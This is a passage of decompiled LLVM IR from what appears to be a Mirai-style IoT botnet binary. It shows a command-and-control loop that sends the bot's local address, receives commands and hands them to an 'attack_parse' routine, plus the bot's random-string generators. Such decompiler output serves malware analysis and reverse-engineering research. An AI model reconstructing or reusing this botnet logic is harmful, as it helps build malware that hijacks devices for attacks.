  %v2_f2e4 = call i32 @kill(i32 %v1_f2e0, i32 9)
  %v1_f2ec = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_f2f0

dec_label_pc_f2f0:                                ; preds = %dec_label_pc_f244, %dec_label_pc_f2b4
  %v2_f2f4 = call i32 @util_strlen(i8* %v1_f2f4)
  %v3_f2f4 = trunc i32 %v2_f2f4 to i16
  store i16 %v3_f2f4, i16* %stack_var_-42, align 2
  %v0_f2fc = call i32 @util_local_addr()
  %v0_f300 = load i32, i32* @r4, align 4
  store i32 %v0_f300, i32* %r2.global-to-local, align 4
  %v1_f304 = load i32, i32* @fp, align 4
  %v2_f304 = inttoptr i32 %v1_f304 to i32*
  store i32 %v0_f2fc, i32* %v2_f304, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f310 = load i32, i32* @r5, align 4
  %v1_f310 = inttoptr i32 %v0_f310 to i32*
  %v2_f310 = load i32, i32* %v1_f310, align 4
  %v4_f314 = call i32 @__libc_send(i32 %v2_f310, i32 ptrtoint (i32* @global_var_1b464.158 to i32), i32 %v0_f300, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_f320 = load i32, i32* @r5, align 4
  %v1_f320 = inttoptr i32 %v0_f320 to i32*
  %v2_f320 = load i32, i32* %v1_f320, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f32c = call i32 @__libc_send(i32 %v2_f320, i32 %v2_f230, i32 1, i32 16384)
  %v3_f330 = load i16, i16* %stack_var_-42, align 2
  %v4_f330 = sext i16 %v3_f330 to i32
  store i32 %v4_f330, i32* %r2.global-to-local, align 4
  %v2_f334 = icmp eq i16 %v3_f330, 0
  br i1 %v2_f334, label %dec_label_pc_ef20, label %dec_label_pc_f33c

dec_label_pc_f33c:                                ; preds = %dec_label_pc_f2f0
  %v0_f33c = load i32, i32* @r5, align 4
  %v1_f33c = inttoptr i32 %v0_f33c to i32*
  %v2_f33c = load i32, i32* %v1_f33c, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f348 = call i32 @__libc_send(i32 %v2_f33c, i32 %v2_ed84, i32 %v4_f330, i32 16384)
  br label %dec_label_pc_ef20

dec_label_pc_f350:                                ; preds = %dec_label_pc_f3a0, %dec_label_pc_f154
  %v0_f350 = load i32, i32* @r8, align 4
  %v1_f350 = inttoptr i32 %v0_f350 to i32*
  %v2_f350 = load i32, i32* %v1_f350, align 4
  store i32 %v2_f350, i32* %r3.global-to-local, align 4
  %v7_f354 = icmp eq i32 %v2_f350, 4
  br i1 %v7_f354, label %dec_label_pc_ef20, label %bb53

bb53:                                             ; preds = %dec_label_pc_f350
  %v8_f358 = icmp eq i32 %v2_f350, 11
  br i1 %v8_f358, label %dec_label_pc_ef20, label %dec_label_pc_f360

dec_label_pc_f360:                                ; preds = %dec_label_pc_f3cc, %bb53, %dec_label_pc_f184
  %v2_f360 = load i32, i32* @global_var_241a4.149, align 4
  store i32 62316, i32* @lr, align 4
  %v1_f368 = icmp ne i32 %v2_f360, -1
  call void @__pseudo_cond_branch(i1 %v1_f368, i32 ptrtoint (i32* @global_var_16390.35 to i32))
  store i32 ptrtoint (i32* @global_var_241a4.149 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_241a4.149, align 4
  %v1_f37c = call i32 @sleep(i32 1)
  br label %dec_label_pc_ef20

dec_label_pc_f384:                                ; preds = %dec_label_pc_f18c
  %v3_f384 = udiv i32 %v4_f190, 256
  %v1_f388 = mul nsw i32 %v4_f190, 256
  %v4_f38c = and i32 %v1_f388, 65280
  %v5_f38c = or i32 %v4_f38c, %v3_f384
  store i32 %v5_f38c, i32* %r3.global-to-local, align 4
  store i32 %v2_f04c, i32* %r2.global-to-local, align 4
  %v6_f398 = trunc i32 %v5_f38c to i16
  store i16 %v6_f398, i16* %stack_var_-42, align 2
  %tmp54 = icmp ugt i32 %v5_f38c, 1024
  br i1 %tmp54, label %dec_label_pc_f434, label %dec_label_pc_f3a0

dec_label_pc_f3a0:                                ; preds = %dec_label_pc_f384, %dec_label_pc_f434
  %v3_f3bc = phi i16 [ %v6_f398, %dec_label_pc_f384 ], [ %v3_f3bc.pre, %dec_label_pc_f434 ]
  %v0_f3a0 = load i32, i32* @r4, align 4
  %v1_f3a0 = load i32, i32* @r8, align 4
  %v2_f3a0 = inttoptr i32 %v1_f3a0 to i32*
  store i32 %v0_f3a0, i32* %v2_f3a0, align 4
  store i32 %v2_f04c, i32* %ip.global-to-local, align 4
  store i32 %v2_f3a8, i32* @r4, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_f3b4 = load i32, i32* @global_var_241a4.149, align 4
  %v4_f3bc = sext i16 %v3_f3bc to i32
  store i32 %v4_f3bc, i32* %r2.global-to-local, align 4
  %v4_f3c0 = call i32 @__libc_recv(i32 %v2_f3b4, i32 %v2_f3a8, i32 %v4_f3bc, i32 16386)
  %v7_f3c4 = icmp eq i32 %v4_f3c0, -1
  br i1 %v7_f3c4, label %dec_label_pc_f350, label %dec_label_pc_f3cc

dec_label_pc_f3cc:                                ; preds = %dec_label_pc_f3a0
  %v2_f3cc = icmp eq i32 %v4_f3c0, 0
  br i1 %v2_f3cc, label %dec_label_pc_f360, label %dec_label_pc_f3d4

dec_label_pc_f3d4:                                ; preds = %dec_label_pc_f3cc
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_f3e4 = load i32, i32* @global_var_241a4.149, align 4
  %v4_f3e8 = call i32 @__libc_recv(i32 %v2_f3e4, i32 %v2_f230, i32 2, i32 16384)
  store i32 %v2_f04c, i32* @lr, align 4
  %v3_f3f0 = load i16, i16* %stack_var_-42, align 2
  %v4_f3f0 = sext i16 %v3_f3f0 to i32
  %v3_f3f4 = udiv i32 %v4_f3f0, 256
  %v1_f3f8 = mul nsw i32 %v4_f3f0, 256
  %v4_f3fc = and i32 %v1_f3f8, 65280
  %v5_f3fc = or i32 %v4_f3fc, %v3_f3f4
  store i32 %v5_f3fc, i32* %ip.global-to-local, align 4
  store i32 %v5_f3fc, i32* %r2.global-to-local, align 4
  %v2_f408 = load i32, i32* @global_var_241a4.149, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_f410 = trunc i32 %v5_f3fc to i16
  store i16 %v6_f410, i16* %stack_var_-42, align 2
  %v6_f414 = call i32 @__libc_recv(i32 %v2_f408, i32 %v2_f3a8, i32 %v5_f3fc, i32 16384)
  store i32 %v2_f04c, i32* %r2.global-to-local, align 4
  %v3_f41c = load i16, i16* %stack_var_-42, align 2
  %v2_f420 = icmp eq i16 %v3_f41c, 0
  br i1 %v2_f420, label %dec_label_pc_ef20, label %dec_label_pc_f428

dec_label_pc_f428:                                ; preds = %dec_label_pc_f3d4
  %v4_f41c = sext i16 %v3_f41c to i32
  %v4_f42c = call i32 @attack_parse(i32* nonnull %stack_var_-1432, i32 %v4_f41c, i32 %v2_f04c)
  br label %dec_label_pc_ef20

dec_label_pc_f434:                                ; preds = %dec_label_pc_f384
  %v2_f434 = load i32, i32* @global_var_241a4.149, align 4
  %v1_f438 = call i32 @__GI___libc_close(i32 %v2_f434)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_f440 = load i32, i32* @r5, align 4
  %v2_f440 = inttoptr i32 %v1_f440 to i32*
  store i32 -1, i32* %v2_f440, align 4
  %v3_f3bc.pre = load i16, i16* %stack_var_-42, align 2
  br label %dec_label_pc_f3a0

; uselistorder directives
  uselistorder i16 %v3_f41c, { 1, 0 }
  uselistorder i32 %v5_f3fc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_f3c0, { 1, 0 }
  uselistorder i32 %v3_f1c4, { 1, 3, 2, 0 }
  uselistorder i32 %v4_f178, { 1, 0 }
  uselistorder i32 %v2_f120, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_f060, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-1436.1, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_f014, { 1, 0 }
  uselistorder i32 %v2_ef60, { 2, 1, 0 }
  uselistorder i32 %v1_ef50, { 1, 2, 0 }
  uselistorder i32 %v1_ef34, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1436.0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v2_f24c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_f230, { 2, 0, 4, 3, 1 }
  uselistorder i32 %v2_f228, { 1, 0 }
  uselistorder i32 %v2_f04c, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_ef1c, { 1, 0, 2 }
  uselistorder i32 %v3_ee98, { 1, 2, 0 }
  uselistorder i32 %v2_edcc, { 0, 13, 1, 2, 12, 3, 11, 4, 10, 5, 9, 8, 6, 14, 7, 15 }
  uselistorder i32 %v2_edb8, { 1, 0, 2 }
  uselistorder i32 %v3_ed14, { 1, 2, 0 }
  uselistorder i32 %v2_ecbc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-152, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i16* %stack_var_-42, { 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25, 26, 28, 27, 30, 29, 22, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 4, 5, 9, 10 }
  uselistorder i32* @global_var_241a8.126, { 1, 0 }
  uselistorder i32 16386, { 1, 3, 0, 4, 2, 5 }
  uselistorder i8* bitcast (i8** @global_var_24340.152 to i8*), { 0, 1, 3, 2 }
  uselistorder i32* @global_var_241a0.128, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32 ()* @scanner_init, { 1, 0 }
  uselistorder i32* @global_var_241a4.149, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 (i8*, i32)* @util_strcpy, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 24, 25, 26, 27, 19, 20, 21, 28, 22, 29, 23, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67 }
  uselistorder i32 ptrtoint (i16** @global_var_26e5c.133 to i32), { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder i32 (i32)* @unlink, { 1, 0 }
  uselistorder label %dec_label_pc_f3a0, { 1, 0 }
  uselistorder label %dec_label_pc_f2f0, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %dec_label_pc_f05c, { 2, 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_efa0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ef90, { 1, 0 }
  uselistorder label %dec_label_pc_ef20, { 7, 1, 8, 2, 0, 9, 3, 10, 11, 4, 5, 12, 6, 13 }
  uselistorder label %dec_label_pc_edac, { 2, 0, 1 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_f494 = load i32, i32* @global_var_24344.160, align 4
  %v2_f498 = load i32, i32* @global_var_24350.162, align 4
  %v4_f4a4 = mul i32 %v2_f494, 2048
  %v5_f4a4 = xor i32 %v4_f4a4, %v2_f494
  store i32 %v5_f4a4, i32* @r3, align 4
  %v4_f4a8 = udiv i32 %v2_f498, 524288
  %v5_f4a8 = xor i32 %v4_f4a8, %v2_f498
  %v2_f4ac = load i32, i32* @global_var_24348.164, align 4
  %v2_f4b0 = load i32, i32* @global_var_2434c.166, align 4
  store i32 %v2_f4b0, i32* @ip, align 4
  %v2_f4b4 = xor i32 %v5_f4a8, %v5_f4a4
  %v4_f4b8 = udiv i32 %v5_f4a4, 256
  %v5_f4b8 = xor i32 %v2_f4b4, %v4_f4b8
  store i32 %v2_f4ac, i32* @global_var_24344.160, align 4
  store i32 %v2_f4b0, i32* @global_var_24348.164, align 4
  store i32 %v2_f498, i32* @global_var_2434c.166, align 4
  store i32 %v5_f4b8, i32* @global_var_24350.162, align 4
  ret i32 %v5_f4b8

; uselistorder directives
  uselistorder i32 %v2_f498, { 2, 1, 0 }
  uselistorder i32 %v2_f494, { 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_f4f0 = call i32 @__GI_time(i32* null)
  store i32 %v2_f4f0, i32* @global_var_24344.160, align 4
  %v1_f4fc = call i32 @__getpid(i32 %v2_f4f0)
  store i32 %v1_f4fc, i32* @r0, align 4
  %v0_f504 = call i32 @getppid()
  %v2_f50c = xor i32 %v1_f4fc, %v0_f504
  store i32 %v2_f50c, i32* @global_var_24348.164, align 4
  %v1_f514 = call i32 @clock(i32 %v2_f50c)
  %v2_f518 = load i32, i32* @global_var_24348.164, align 4
  %v2_f524 = xor i32 %v2_f518, %v1_f514
  store i32 %v2_f524, i32* @global_var_24350.162, align 4
  store i32 %v1_f514, i32* @global_var_2434c.166, align 4
  ret i32 %v1_f514

; uselistorder directives
  uselistorder i32 %v1_f514, { 1, 2, 0 }
  uselistorder i32 ()* @getppid, { 1, 2, 0 }
  uselistorder i32 (i32)* @__getpid, { 0, 2, 1 }
}

define i32 @rand_alphastr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_1b46c.172 to i32), i32* @r1, align 4
  %v2_f560 = ptrtoint i32* %stack_var_-73 to i32
  store i32 %v2_f560, i32* @r0, align 4
  store i32 33, i32* @r2, align 4
  %v0_f568 = call i32 @memcpy()
  store i32 %v0_f568, i32* %r0.global-to-local, align 4
  %v0_f56c = load i32, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f56c = icmp slt i32 %v0_f56c, 0
  store i1 %v1_f56c, i1* %cpsr_n.global-to-local, align 1
  %v2_f56c = icmp eq i32 %v0_f56c, 0
  store i1 %v2_f56c, i1* %cpsr_z.global-to-local, align 1
  %tmp24 = icmp slt i32 %v0_f56c, 1
  br i1 %tmp24, label %dec_label_pc_f664, label %dec_label_pc_f574

dec_label_pc_f574:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_24350.162 to i32), i32* %fp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2434c.166 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24348.164 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24344.160 to i32), i32* %r3.global-to-local, align 4
  %v2_f584 = load i32, i32* @global_var_24350.162, align 4
  store i32 %v2_f584, i32* %r5.global-to-local, align 4
  %v2_f588 = load i32, i32* @global_var_2434c.166, align 4
  store i32 %v2_f588, i32* %sb.global-to-local, align 4
  %v2_f58c = load i32, i32* @global_var_24348.164, align 4
  store i32 %v2_f58c, i32* %sl.global-to-local, align 4
  %v2_f590 = load i32, i32* @global_var_24344.160, align 4
  store i32 %v2_f590, i32* %r0.global-to-local, align 4
  %v2_f59c = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_f600

dec_label_pc_f598:                                ; preds = %dec_label_pc_f600
  %v1_f598 = urem i32 %v5_f610, 256
  store i32 %v1_f598, i32* %r3.global-to-local, align 4
  store i32 %v2_f59c, i32* %r1.global-to-local, align 4
  %v4_f5a0 = udiv i32 %v1_f598, 8
  %v5_f5a0 = add i32 %v4_f5a0, %v2_f59c
  store i32 %v5_f5a0, i32* %r2.global-to-local, align 4
  %v1_f5a4 = add i32 %v5_f5a0, -33
  %v2_f5a4 = inttoptr i32 %v1_f5a4 to i8*
  %v3_f5a4 = load i8, i8* %v2_f5a4, align 1
  %v4_f5a4 = zext i8 %v3_f5a4 to i32
  store i32 %v4_f5a4, i32* %r0.global-to-local, align 4
  %v3_f5a8 = mul i32 %v5_f610, 65536
  store i32 %v3_f5a8, i32* %r1.global-to-local, align 4
  store i32 %v2_f59c, i32* %r2.global-to-local, align 4
  %tmp25 = udiv i32 %v5_f610, 2048
  %v4_f5b0 = urem i32 %tmp25, 32
  %v5_f5b0 = add i32 %v4_f5b0, %v2_f59c
  store i32 %v5_f5b0, i32* %r3.global-to-local, align 4
  %v1_f5b4 = add i32 %v5_f5b0, -33
  %v2_f5b4 = inttoptr i32 %v1_f5b4 to i8*
  %v3_f5b4 = load i8, i8* %v2_f5b4, align 1
  %v4_f5b4 = zext i8 %v3_f5b4 to i32
  store i32 %v4_f5b4, i32* %ip.global-to-local, align 4
  %v3_f5b8 = mul i32 %v5_f610, 256
  store i32 %v3_f5b8, i32* %r2.global-to-local, align 4
  %v3_f5bc = inttoptr i32 %v0_f614 to i8*
  store i8 %v3_f5a4, i8* %v3_f5bc, align 1
  %v4_f5bc = load i32, i32* %r6.global-to-local, align 4
  %v5_f5bc = add i32 %v4_f5bc, 1
  store i32 %v5_f5bc, i32* %r6.global-to-local, align 4
  %v1_f5c4 = load i32, i32* %r2.global-to-local, align 4
  %v4_f5c4 = udiv i32 %v1_f5c4, 134217728
  %v5_f5c4 = add i32 %v4_f5c4, %v2_f59c
  store i32 %v5_f5c4, i32* %r1.global-to-local, align 4
  %v1_f5c8 = load i32, i32* %r4.global-to-local, align 4
  %v4_f5c8 = udiv i32 %v1_f5c8, 134217728
  %v5_f5c8 = add i32 %v4_f5c8, %v2_f59c
  store i32 %v5_f5c8, i32* %r3.global-to-local, align 4
  %v1_f5cc = add i32 %v5_f5c4, -33
  %v2_f5cc = inttoptr i32 %v1_f5cc to i8*
  %v3_f5cc = load i8, i8* %v2_f5cc, align 1
  %v4_f5cc = zext i8 %v3_f5cc to i32
  store i32 %v4_f5cc, i32* %lr.global-to-local, align 4
  %v1_f5d0 = add i32 %v5_f5c8, -33
  %v2_f5d0 = inttoptr i32 %v1_f5d0 to i8*
  %v3_f5d0 = load i8, i8* %v2_f5d0, align 1
  %v4_f5d0 = zext i8 %v3_f5d0 to i32
  store i32 %v4_f5d0, i32* %r2.global-to-local, align 4
  %v0_f5d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_f5d4 = add i32 %v0_f5d4, -4
  store i32 %v1_f5d4, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f5d8 = icmp slt i32 %v1_f5d4, 0
  store i1 %v1_f5d8, i1* %cpsr_n.global-to-local, align 1
  %v2_f5d8 = icmp eq i32 %v1_f5d4, 0
  store i1 %v2_f5d8, i1* %cpsr_z.global-to-local, align 1
  %v0_f5dc = load i32, i32* %ip.global-to-local, align 4
  %v1_f5dc = trunc i32 %v0_f5dc to i8
  %v2_f5dc = load i32, i32* %r8.global-to-local, align 4
  %v3_f5dc = add i32 %v2_f5dc, 1
  %v4_f5dc = inttoptr i32 %v3_f5dc to i8*
  store i8 %v1_f5dc, i8* %v4_f5dc, align 1
  %v0_f5e0 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_f5e0, i32* %r0.global-to-local, align 4
  %v0_f5e4 = load i32, i32* %r8.global-to-local, align 4
  %v1_f5e4 = add i32 %v0_f5e4, 4
  store i32 %v1_f5e4, i32* %r8.global-to-local, align 4
  %v0_f5e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_f5e8 = trunc i32 %v0_f5e8 to i8
  %v2_f5e8 = load i32, i32* %r6.global-to-local, align 4
  %v3_f5e8 = add i32 %v2_f5e8, 2
  %v4_f5e8 = inttoptr i32 %v3_f5e8 to i8*
  store i8 %v1_f5e8, i8* %v4_f5e8, align 1
  %v0_f5ec = load i32, i32* %lr.global-to-local, align 4
  %v1_f5ec = trunc i32 %v0_f5ec to i8
  %v2_f5ec = load i32, i32* %r6.global-to-local, align 4
  %v3_f5ec = add i32 %v2_f5ec, 1
  %v4_f5ec = inttoptr i32 %v3_f5ec to i8*
  store i8 %v1_f5ec, i8* %v4_f5ec, align 1
  %v0_f5f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f5f0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_f5f0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_f5f0 = xor i1 %v1_f5f0, %v2_f5f0
  %v4_f5f0 = or i1 %v0_f5f0, %v3_f5f0
  br i1 %v4_f5f0, label %dec_label_pc_f648, label %dec_label_pc_f598.dec_label_pc_f5f4_crit_edge

dec_label_pc_f598.dec_label_pc_f5f4_crit_edge:    ; preds = %dec_label_pc_f598
  %v0_f600.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f5f4

dec_label_pc_f5f4:                                ; preds = %dec_label_pc_f598.dec_label_pc_f5f4_crit_edge, %dec_label_pc_f61c
  %v0_f600.pre = phi i32 [ %v0_f600.pre.pre, %dec_label_pc_f598.dec_label_pc_f5f4_crit_edge ], [ %v0_f640, %dec_label_pc_f61c ]
  %v0_f5f4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f5f4, i32* %sl.global-to-local, align 4
  %v0_f5f8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_f5f8, i32* %sb.global-to-local, align 4
  %v0_f5fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f5fc, i32* %r5.global-to-local, align 4
  %v0_f60c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f600

dec_label_pc_f600:                                ; preds = %dec_label_pc_f574, %dec_label_pc_f5f4
  %v0_f630 = phi i32 [ %v0_f56c, %dec_label_pc_f574 ], [ %v0_f60c.pre, %dec_label_pc_f5f4 ]
  %v0_f604 = phi i32 [ %v2_f584, %dec_label_pc_f574 ], [ %v0_f5fc, %dec_label_pc_f5f4 ]
  %v0_f600 = phi i32 [ %v2_f590, %dec_label_pc_f574 ], [ %v0_f600.pre, %dec_label_pc_f5f4 ]
  %v4_f600 = mul i32 %v0_f600, 2048
  %v5_f600 = xor i32 %v4_f600, %v0_f600
  store i32 %v5_f600, i32* %r3.global-to-local, align 4
  %v4_f604 = udiv i32 %v0_f604, 524288
  %v5_f604 = xor i32 %v4_f604, %v0_f604
  %v2_f608 = xor i32 %v5_f604, %v5_f600
  store i32 %v2_f608, i32* %r2.global-to-local, align 4
  %v1_f60c = add i32 %v0_f630, -3
  %v3_f60c = sub i32 2, %v0_f630
  %v4_f60c = and i32 %v3_f60c, %v0_f630
  %v5_f60c = icmp slt i32 %v4_f60c, 0
  store i1 %v5_f60c, i1* %cpsr_v.global-to-local, align 1
  %v6_f60c = icmp slt i32 %v1_f60c, 0
  store i1 %v6_f60c, i1* %cpsr_n.global-to-local, align 1
  %v7_f60c = icmp eq i32 %v0_f630, 3
  store i1 %v7_f60c, i1* %cpsr_z.global-to-local, align 1
  %v2_f610 = and i32 %v0_f600, 128
  %v3_f610 = icmp ne i32 %v2_f610, 0
  %v4_f610 = udiv i32 %v5_f600, 256
  %v5_f610 = xor i32 %v4_f610, %v2_f608
  store i32 %v5_f610, i32* %r4.global-to-local, align 4
  %v0_f614 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_f614, i32* %r6.global-to-local, align 4
  %v2_f618 = xor i1 %v7_f60c, true
  %v3_f618 = and i1 %v3_f610, %v2_f618
  br i1 %v3_f618, label %dec_label_pc_f598, label %dec_label_pc_f61c

dec_label_pc_f61c:                                ; preds = %dec_label_pc_f600
  %v1_f630 = add i32 %v0_f630, -1
  store i32 %v1_f630, i32* %r7.global-to-local, align 4
  %v2_f62c.neg = urem i32 %v5_f610, 33
  store i32 %v2_f62c.neg, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f638 = icmp slt i32 %v1_f630, 0
  store i1 %v1_f638, i1* %cpsr_n.global-to-local, align 1
  %v2_f638 = icmp eq i32 %v1_f630, 0
  store i1 %v2_f638, i1* %cpsr_z.global-to-local, align 1
  %v1_f63c = trunc i32 %v2_f62c.neg to i8
  %v3_f63c = inttoptr i32 %v0_f614 to i8*
  store i8 %v1_f63c, i8* %v3_f63c, align 1
  %v4_f63c = load i32, i32* %r8.global-to-local, align 4
  %v5_f63c = add i32 %v4_f63c, 1
  store i32 %v5_f63c, i32* %r8.global-to-local, align 4
  %v0_f640 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_f640, i32* %r0.global-to-local, align 4
  %v0_f644 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f644 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_f644 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_f644 = xor i1 %v1_f644, %v2_f644
  %v4_f644 = or i1 %v0_f644, %v3_f644
  br i1 %v4_f644, label %dec_label_pc_f648, label %dec_label_pc_f5f4

dec_label_pc_f648:                                ; preds = %dec_label_pc_f61c, %dec_label_pc_f598
  store i32 ptrtoint (i32* @global_var_2434c.166 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24348.164 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24344.160 to i32), i32* %r1.global-to-local, align 4
  %v0_f654 = load i32, i32* %r4.global-to-local, align 4
  %v1_f654 = load i32, i32* %fp.global-to-local, align 4
  %v2_f654 = inttoptr i32 %v1_f654 to i32*
  store i32 %v0_f654, i32* %v2_f654, align 4
  %v0_f658 = load i32, i32* %r5.global-to-local, align 4
  %v1_f658 = load i32, i32* %r2.global-to-local, align 4
  %v2_f658 = inttoptr i32 %v1_f658 to i32*
  store i32 %v0_f658, i32* %v2_f658, align 4
  %v0_f65c = load i32, i32* %sb.global-to-local, align 4
  %v1_f65c = load i32, i32* %r3.global-to-local, align 4
  %v2_f65c = inttoptr i32 %v1_f65c to i32*
  store i32 %v0_f65c, i32* %v2_f65c, align 4
  %v0_f660 = load i32, i32* %sl.global-to-local, align 4
  %v1_f660 = load i32, i32* %r1.global-to-local, align 4
  %v2_f660 = inttoptr i32 %v1_f660 to i32*
  store i32 %v0_f660, i32* %v2_f660, align 4
  %v1_f66c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f664

dec_label_pc_f664:                                ; preds = %entry, %dec_label_pc_f648
  %v1_f66c = phi i32 [ %v0_f568, %entry ], [ %v1_f66c.pre, %dec_label_pc_f648 ]
  ret i32 %v1_f66c

; uselistorder directives
  uselistorder i32 %v0_f640, { 1, 0 }
  uselistorder i32 %v2_f62c.neg, { 1, 0 }
  uselistorder i32 %v0_f614, { 1, 2, 0 }
  uselistorder i32 %v5_f610, { 0, 5, 4, 2, 3, 1 }
  uselistorder i32 %v0_f600, { 2, 1, 0 }
  uselistorder i32 %v0_f604, { 1, 0 }
  uselistorder i32 %v0_f630, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v2_f59c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_f56c, { 0, 1, 3, 2 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 5, 1, 3, 4, 6 }
  uselistorder i32* %r6.global-to-local, { 4, 0, 1, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 8, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 5, 6, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder label %dec_label_pc_f664, { 1, 0 }
  uselistorder label %dec_label_pc_f600, { 1, 0 }
  uselistorder label %dec_label_pc_f5f4, { 1, 0 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
